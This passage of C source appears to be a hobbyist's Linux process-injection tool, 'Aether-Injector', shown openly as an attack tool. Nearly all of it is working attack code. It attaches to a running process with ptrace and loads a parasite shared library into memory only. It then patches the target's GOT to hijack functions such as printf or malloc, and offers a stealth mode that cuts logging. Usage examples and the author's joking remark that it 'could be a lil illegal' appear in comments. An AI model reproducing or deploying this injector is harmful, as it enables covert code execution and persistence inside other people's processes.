		ae_log(AE_LOG_DEBUG, "Symbol <%s> not found in %d symbols with relocations", opt->func, sinfo->count);
		ae_log(AE_LOG_DEBUG, "Available symbols with GOT entries:");
		int shown = 0;
		for (int i = 0; i < sinfo->count && shown < 10; i++) {
			if (sinfo->syms[i].offset != 0) {
				ae_log(AE_LOG_DEBUG, "  %s (offset: 0x%lx)", sinfo->syms[i].name, (unsigned long)sinfo->syms[i].offset);
				shown++;
			}
		}
	}
	return ret;
}


// ship it no notes
static void
ae_print_banner (void)
{
	fprintf(stderr, "\n");
	fprintf(stderr, "    ___          __  __                \n");
	fprintf(stderr, "   /   | ___  __/ /_/ /_  ___  _____  \n");
	fprintf(stderr, "  / /| |/ _ \\/ __/ __ \\/ _ \\/ ___/  \n");
	fprintf(stderr, " / ___ /  __/ /_/ / / /  __/ /      \n");
	fprintf(stderr, "/_/  |_\\___/\\__/_/ /_/\\___/_/       \n");
	fprintf(stderr, "                                      \n");
	fprintf(stderr, "   Aether-Injector v1.0               \n");
	fprintf(stderr, "   Memory-Only Process Injection      \n");
	fprintf(stderr, "\n");
}
// the design is so cool right


static void
ae_usage (char ** argv)
{
	ae_log(AE_LOG_INFO, "\nUsage: %s -t <pid> -m <module> -f <function> [opts]", argv[0]);
	ae_log(AE_LOG_INFO, "\nRequired Arguments:");
	ae_log(AE_LOG_INFO, "  -t <pid>       Target process ID");
	ae_log(AE_LOG_INFO, "  -m <module>    Path to shared object (.so) to inject");
	ae_log(AE_LOG_INFO, "  -f <function>  Function name to hijack in target process");
	ae_log(AE_LOG_INFO, "\nOptional Arguments:");
	ae_log(AE_LOG_INFO, "  -s             Stealth mode (memory-only injection, reduced logging)");
	ae_log(AE_LOG_INFO, "\nExamples:");
	ae_log(AE_LOG_INFO, "  %s -t 1234 -m ae_parasite.so.1.0 -f printf", argv[0]);
	ae_log(AE_LOG_INFO, "  %s -t 5678 -m ae_parasite.so.1.0 -f malloc -s", argv[0]);

	exit(EXIT_SUCCESS);
}



// its not pretty but it gets the job done fuck it
static void 
ae_parse_args (int argc, char ** argv, struct ae_opts * opt)
{
	int c;
	opterr = 0;

	opt->stealth  = false;
	opt->pid      = -1;
	opt->libname  = NULL;
	opt->func     = NULL;
	
	while ((c = getopt(argc, argv, "st:m:f:")) != -1) {
		switch (c) {
			case 's':
				opt->stealth = true;
				break;
			case 't':
				opt->pid = (int)atol(optarg);
				break;
			case 'm':
				opt->libname = optarg;
				break;
			case 'f':
				opt->func = optarg;
				break;
			case '?':
				if (isprint(optopt))
					ae_log(AE_LOG_ERROR, "Unknown option '-%c'", optopt);
				else 
					ae_log(AE_LOG_ERROR, "Unknown option character '\\x%x", optopt);
				exit(EXIT_FAILURE);
			default:
				abort();
		}
	}

	if (opt->pid == -1) {
		ae_log(AE_LOG_ERROR, "-t option is required (target PID)");
		ae_usage(argv);
	}

	if (opt->func == NULL) {
		ae_log(AE_LOG_ERROR, "-f option is required (function name)");
		ae_usage(argv);
	}

	if (opt->libname == NULL) {
		ae_log(AE_LOG_ERROR, "-m option is required (module path)");
		ae_usage(argv);
	}
}


// idk
static char * 
ae_map_binary (int pid)
{
	char meminfo[MAXBUF] = {0};
	char proc_status[MAXBUF];
	struct stat64 st;
	int fd;
	char * ret = NULL;
	FILE *status_file;

	snprintf(proc_status, sizeof(proc_status), "/proc/%d/status", pid);
	status_file = fopen(proc_status, "r");
	if (!status_file) {
		ae_log(AE_LOG_ERROR, "Process %d does not exist or is not accessible", pid);
		return MAP_FAILED;
	}
	fclose(status_file);

	snprintf(meminfo, sizeof(meminfo), "/proc/%d/exe", pid);

	if ((fd = open(meminfo, O_RDONLY)) == -1) {
		ae_log(AE_LOG_ERROR, "Could not open binary at %s: %s (PID %d may be a kernel thread or exited)", 
		       meminfo, strerror(errno), pid);
		return MAP_FAILED;
	}

	if (fstat64(fd, &st) < 0) {
		ae_log(AE_LOG_ERROR, "Could not stat binary: %s (fd=%d, pid=%d)", 
		       strerror(errno), fd, pid);
		close(fd);
		return MAP_FAILED;
	}

	if (st.st_size <= 0) {
		ae_log(AE_LOG_ERROR, "Invalid binary size: %ld bytes", (long)st.st_size);
		close(fd);
		return MAP_FAILED;
	}

	ret = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

	close(fd);

	if (ret == MAP_FAILED) {
		ae_log(AE_LOG_ERROR, "mmap failed: %s", strerror(errno));
	}

	return ret;
}


static bool
ae_good_elf (void * ehdr_ptr, struct ae_opts * opt)
{
	(void)opt;  /* suppress unused warning */
	unsigned char *e_ident = (unsigned char *)ehdr_ptr;
	
	if (!(e_ident[EI_MAG0] == ELFMAG0 &&
 		  e_ident[EI_MAG1] == ELFMAG1 &&
		  e_ident[EI_MAG2] == ELFMAG2 &&
		  e_ident[EI_MAG3] == ELFMAG3)) {
		ae_log(AE_LOG_ERROR, "Binary is not an ELF executable");
		return false;
	}

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	if (e_ident[EI_CLASS] != ELFCLASS64) {
		ae_log(AE_LOG_ERROR, "Only 64-bit ELF executables are supported on 64-bit build");
		return false;
	}
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ehdr_ptr;
#else
	if (e_ident[EI_CLASS] != ELFCLASS32) {
		ae_log(AE_LOG_ERROR, "Only 32-bit ELF executables are supported on 32-bit build");
		return false;
	}
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)ehdr_ptr;
#endif

	if (!(ehdr->e_type == ET_EXEC || ehdr->e_type == ET_DYN)) {
		ae_log(AE_LOG_ERROR, "Only executable binaries are supported");
		return false;
	}

	return true;
}


static inline bool 
ae_binary_is_pie (void * ehdr_ptr)
{
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ehdr_ptr;
#else
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)ehdr_ptr;
#endif
	return (ehdr->e_type == ET_DYN);
}


static void
ae_parse_headers (void * ehdr_ptr, struct ae_segments * segs)
{
	int i;

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ehdr_ptr;
	Elf64_Phdr * phdr = (Elf64_Phdr*)((char*)ehdr + ehdr->e_phoff);

	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_LOAD) { 
			/* .text */
			if (phdr->p_flags == (PF_X | PF_R)) {
				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
				ae_text_base = phdr->p_vaddr;
				ae_text_base_original = phdr->p_vaddr;
				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
			}

			/* .data */
			if (phdr->p_flags == (PF_W | PF_R)) {
				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
				ae_data_base = phdr->p_vaddr;
				segs->segs[TYPE_DATA].offset = phdr->p_offset;
				segs->segs[TYPE_DATA].len    = phdr->p_filesz;
			}
		}
	}
#else
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)ehdr_ptr;
	Elf32_Phdr * phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);

	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_LOAD) { 
			/* .text */
			if (phdr->p_flags == (PF_X | PF_R)) {
				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
				ae_text_base = phdr->p_vaddr;
				ae_text_base_original = phdr->p_vaddr;
				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
			}

			/* .data */
			if (phdr->p_flags == (PF_W | PF_R)) {
				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
				ae_data_base = phdr->p_vaddr;
				segs->segs[TYPE_DATA].offset = phdr->p_offset;
				segs->segs[TYPE_DATA].len    = phdr->p_filesz;
			}
		}
	}
#endif
}


static int
ae_inject_lib (struct ae_opts * opt, ulong_t * evilbase, struct ae_segments * segs)
{
	if (!opt->stealth)
		ae_log(AE_LOG_DEBUG, "Injecting library via memory-only phantom load");
	
	/* ae_mmap_library handles its own attach/detach, so we don't need to attach here */
	if (ae_mmap_library(opt->pid, opt->libname, evilbase, segs) < 0) {
		return -1;
	}

	/* Re-attach for subsequent operations (searching for evil function, patching GOT) */
	if (!opt->stealth)
		ae_log(AE_LOG_DEBUG, "Re-attaching to process %d for GOT patching", opt->pid);
	if (ptrace(PTRACE_ATTACH, opt->pid, NULL, NULL)) {
		ae_log(AE_LOG_ERROR, "Could not attach");
		return -1;
	}

	int status;
	pid_t wait_result = ae_waitpid_with_timeout(opt->pid, &status, WAITPID_TIMEOUT_SEC, "re-attach");
	if (wait_result == 0) {
		ae_log(AE_LOG_ERROR, "Timeout waiting for process to stop after re-attach");
		return -1;
	}
	if (wait_result == -1) {
		ae_log(AE_LOG_ERROR, "waitpid failed after re-attach: %s", strerror(errno));
		return -1;
	}
	if (!WIFSTOPPED(status)) {
		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (inject_lib), status: 0x%x", status);
		return -1;
	}
	if (!opt->stealth)
		ae_log(AE_LOG_DEBUG, "Successfully re-attached and process is stopped");

	return 0;
}


// got tired of these coments yet cuz i am 
/* returns the base address (first mapping with offset 0 that belongs to the executable) */
static ulong_t
ae_get_pie_base(int pid)
{
	FILE *f;
	char path[256], line[1024];
	ulong_t base = 0;
	ulong_t start, end;
	char perms[8], offset[16], dev[16], inode[32], pathname[512];

	snprintf(path, sizeof(path), "/proc/%d/maps", pid);
	f = fopen(path, "r");
	if (!f)
		return 0;

	/* find the first mapping with offset 0 that belongs to the main executable */
	/* example: 56574000-56575000 r--p 00000000 08:50 1679 /tmp/ae_daemon */
	while (fgets(line, sizeof(line), f)) {
		/* Parse using sscanf - pathname is optional and may have leading spaces */
		if (sscanf(line, "%lx-%lx %7s %15s %15s %31s %511[^\n]", 
		           &start, &end, perms, offset, dev, inode, pathname) >= 6) {
			/* ceck if offset is 0 */
			if (strcmp(offset, "00000000") == 0) {
				/* check if it's a real file path (not [heap], [stack], [vdso], etc.) */
				/* skip leading spaces in pathname */
				char *p = pathname;
				while (*p == ' ' || *p == '\t') p++;
    
				if (*p != '\0' && *p != '[') {
					/* rhis is the first mapping of the main executable */
					base = start;
					break;
				}
			}
		} else {
			/* try parsing without pathname (some mappings don't have one) */
			if (sscanf(line, "%lx-%lx %7s %15s %15s %31s", 
			           &start, &end, perms, offset, dev, inode) >= 5) {
				if (strcmp(offset, "00000000") == 0) {
					/* skip if no pathname */
					continue;
				}
			}
		}
	}
	fclose(f);
	
	return base;
}

// Just realized this project could be a lil illegal ahem... JUST FOR EDUCATIONAL PURPORSES POLICE OFFICER
/* find a writable memory region from /proc/pid/maps */
static ulong_t
ae_find_writable_region(int pid, size_t size)
{
	FILE *f;
	char path[256], line[1024];
	ulong_t start, end;
	
	snprintf(path, sizeof(path), "/proc/%d/maps", pid);
	f = fopen(path, "r");
	if (!f)
		return 0;
	
	/* look for a writable mapping (rw-p or rw-) */
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, " rw-p ") || strstr(line, " rw- ")) {
			/* parse start-end addresses */
			if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
				if ((end - start) >= size) {
					fclose(f);
					/* return address in the middle of the region */
					return start + ((end - start) / 2);
				}
			}
		}
	}
	
	fclose(f);
	return 0;
}

static inline void
ae_attach (int pid)
{
	int status;

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Attaching to process %d", pid);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
		ae_log(AE_LOG_ERROR, "Failed to attach to process: %s", strerror(errno));
		exit(EXIT_FAILURE);
	}
	
	pid_t wait_result = ae_waitpid_with_timeout(pid, &status, WAITPID_TIMEOUT_SEC, "initial attach");
	if (wait_result == 0) {
		ae_log(AE_LOG_ERROR, "Timeout waiting for process to stop after attach");
		exit(EXIT_FAILURE);
	}
	if (wait_result == -1) {
		ae_log(AE_LOG_ERROR, "waitpid failed after attach: %s", strerror(errno));
		exit(EXIT_FAILURE);
	}
	
	/* Ensure process is stopped */
	if (!WIFSTOPPED(status)) {
		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (status: 0x%x)", status);
		exit(EXIT_FAILURE);
	}
	
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Successfully attached and process is stopped");
	
	/* Set ptrace options to ensure proper behavior */
	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) == -1) {
		/* Non-fatal, just log */
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Could not set ptrace options: %s", strerror(errno));
	}
}


int 
main (int argc, char **argv)
{
	uchar_t * mem = NULL;
	void *ehdr;
	uintptr_t ret;
	ulong_t evilfunc;
	ulong_t evilbase;
	struct ae_sym_info * sinfo;

	struct ae_opts opt;
	struct ae_segments segs;

	unsigned char evil_code[MAXBUF];
	ulong_t injection_vaddr = 0;

	ae_print_banner();
	ae_parse_args(argc, argv, &opt);
	
	ae_stealth_mode = opt.stealth;

	if (!opt.stealth)
		ae_log(AE_LOG_INFO, "Target PID: %d | Module: %s | Function: %s", opt.pid, opt.libname, opt.func);

	mem = ae_map_binary(opt.pid);
	if (mem == MAP_FAILED) {
		ae_log(AE_LOG_ERROR, "Could not map binary");
		exit(EXIT_FAILURE);
	}

	ehdr = (void *)mem;

	if (!ae_good_elf(ehdr, &opt)) {
		ae_log(AE_LOG_ERROR, "ELF verification failed");
		exit(EXIT_FAILURE);
	}

	bool is_pie = ae_binary_is_pie(ehdr);
	if (!opt.stealth && is_pie)
		ae_log(AE_LOG_INFO, "Target is PIE binary (ET_DYN)");

	ae_parse_headers(ehdr, &segs);

	ae_attach(opt.pid);
	
	// PIE binaries load at random addresses so we need to find actual base fuck PIE
	if (is_pie) {
		ulong_t pie_base = ae_get_pie_base(opt.pid);
		if (pie_base > 0) {
			ae_text_base += pie_base;
			if (ae_data_base > 0) {
				ulong_t calculated_data_base = ae_data_base + pie_base;
				
				FILE *f;
				char path[256], line[1024];
				ulong_t actual_data_base = 0;
				
				snprintf(path, sizeof(path), "/proc/%d/maps", opt.pid);
				f = fopen(path, "r");
				if (f) {
					while (fgets(line, sizeof(line), f)) {
						ulong_t start = strtoul(line, NULL, 16);
						if ((strstr(line, " rw-p ") || strstr(line, " rw- ")) && 
						    start >= calculated_data_base && 
						    start < calculated_data_base + 0x10000) {
							actual_data_base = start;
							break;
						}
					}
					fclose(f);
				}
    
				if (actual_data_base > 0) {
					ae_data_base = actual_data_base;
				} else {
					ae_data_base = calculated_data_base;
				}
			} else {
				ae_log(AE_LOG_ERROR, "Invalid data segment base address");
				exit(EXIT_FAILURE);
			}
		} else {
			ae_log(AE_LOG_ERROR, "Failed to determine PIE base address");
			exit(EXIT_FAILURE);
		}
	}
	
	if (ae_data_base == 0) {
		ae_log(AE_LOG_ERROR, "Data segment base address is zero");
		exit(EXIT_FAILURE);
	}

	sinfo = ae_get_plt(mem);
	
	if (!sinfo) {
		ae_log(AE_LOG_ERROR, "Could not parse PLT information");
		exit(EXIT_FAILURE);
	}

	if (!opt.stealth)
		ae_log(AE_LOG_DEBUG, "Checking if library %s is already present in process", opt.libname);
	if (ae_evil_lib_present(opt.libname, opt.pid)) {
		ae_log(AE_LOG_ERROR, "Process %d already infected, %s is mmap'd already", opt.pid, opt.libname);
		goto out_err;
	} else {
		if (!opt.stealth)
			ae_log(AE_LOG_DEBUG, "Library not present, proceeding with injection");
		if (ae_inject_lib(&opt, &evilbase, &segs) < 0) {
			ae_log(AE_LOG_ERROR, "Library injection failed");
			goto out_err;
		}
		if (!opt.stealth)
			ae_log(AE_LOG_DEBUG, "Library injection completed, base address: 0x%lx", evilbase);
	}

	if (!opt.stealth)
		ae_log(AE_LOG_DEBUG, "Searching for evil function in injected library (base: 0x%lx)", evilbase);
	
	evilfunc = ae_find_function_by_symbol(opt.libname, evilbase, 
	                                      segs.segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1),
	                                      segs.segs[TYPE_TEXT].base);
	
	if (evilfunc == 0) {
		if (!opt.stealth)
			ae_log(AE_LOG_DEBUG, "Symbol lookup failed, falling back to signature search");
		evilfunc = ae_search_evil_lib(opt.pid, opt.libname, evilbase, segs.segs[TYPE_TEXT].len);
	}
	
	if (evilfunc == 0) {
		ae_log(AE_LOG_ERROR, "Could not locate evil function");
		goto out_err;
	}
	if (!opt.stealth)
		ae_log(AE_LOG_DEBUG, "Found evil function at address: 0x%lx", evilfunc);

	if (!opt.stealth) {
		ae_log(AE_LOG_DEBUG, "Evil function location: 0x%lx", evilfunc);
		ae_log(AE_LOG_DEBUG, "Modifying GOT entry to replace <%s> with 0x%lx", opt.func, evilfunc);
	}

	ulong_t target_base = is_pie ? ae_text_base : 0;
	ret = ae_patch_got(&opt, sinfo, target_base, evilfunc, is_pie);

	if (ret == evilfunc) {
		if (!opt.stealth)
			ae_log(AE_LOG_DEBUG, "Successfully modified GOT entry");
		else
			ae_log(AE_LOG_SUCCESS, "Injection complete");
	} else {
		ae_log(AE_LOG_ERROR, "Failed to modify GOT entry");
		goto out_err;
	} 

	if (!opt.stealth)
		ae_log(AE_LOG_DEBUG, "New GOT value: 0x%lx", (unsigned long)ret);

	/* copy our evil function code from target process so we can search for the transfer code pattern */
	ae_ptrace_cpy_from((ulong_t*)evil_code, evilfunc, MAXBUF, opt.pid);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	/* 64-bit: pattern is 48 b8 00 00 00 00 00 00 00 00 (movabs $0x0, %rax)
	 * tc from ae_signatures_64.h contains the pattern bytes to search for
	 * After finding the pattern, we patch the 8-byte immediate */
	size_t tc_len = sizeof(tc) - 1;
	for (int i = 0; i < MAXBUF - (int)tc_len - 8; i++) {
		if (memcmp(&evil_code[i], tc, tc_len) == 0) {
			if (!opt.stealth)
				ae_log(AE_LOG_DEBUG, "Located 64-bit transfer code at offset %d. Patching with %lx", i, ae_original);
			/* patch the 8 bytes after the movabs opcode (the immediate value) */
			injection_vaddr = evilfunc + i + tc_len;
			break;
		}
	}
#else
	/* 32-bit: pattern \xc7\x45\xf4\x00 is mov [ebp-0xc], 0x00000000
	 * search for the pattern byte by byte */
	for (int i = 0; i < MAXBUF - 4; i++) {
		if (memcmp(&evil_code[i], tc, 4) == 0) {
			if (!opt.stealth)
				ae_log(AE_LOG_DEBUG, "Located transfer code at offset %d. Patching with %lx", i, ae_original);
			/* patch the 4 bytes after the mov instruction (the immediate value) */
			injection_vaddr = evilfunc + i + 4;
			break;
		}
	}
#endif

	if (!injection_vaddr) {
		ae_log(AE_LOG_DEBUG, "Could not locate transfer code within parasite (this is OK if you don't need to call original function)");
		if (!opt.stealth) {
			ae_log(AE_LOG_DEBUG, "First 128 bytes of evil function:");
			for (int j = 0; j < 128 && j < MAXBUF; j++) {
				if (j % 16 == 0) fprintf(stderr, "  %04x: ", j);
				fprintf(stderr, "%02x ", (unsigned char)evil_code[j]);
				if (j % 16 == 15) fprintf(stderr, "\n");
			}
			if (128 % 16 != 0) fprintf(stderr, "\n");
		}
	} else {
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
		/* 64-bit: patch 8 bytes */
		ptrace(PTRACE_POKETEXT, opt.pid, injection_vaddr, ae_original);
#else
		ae_inject_transfer_code(opt.pid, injection_vaddr, ae_original);
#endif
	}

done:
	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
	return 0;

out_err:
	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
	return EXIT_FAILURE;
}

//  im actually not as stupid as i thought i was
// Also i did this project for ECSC and the mentors are hyping me up like too young for top 10 but hey yall basically wanna groom me so in 2 years time ima be a cyber genius i made this project for my cv and so yall accept me so u better do.. pls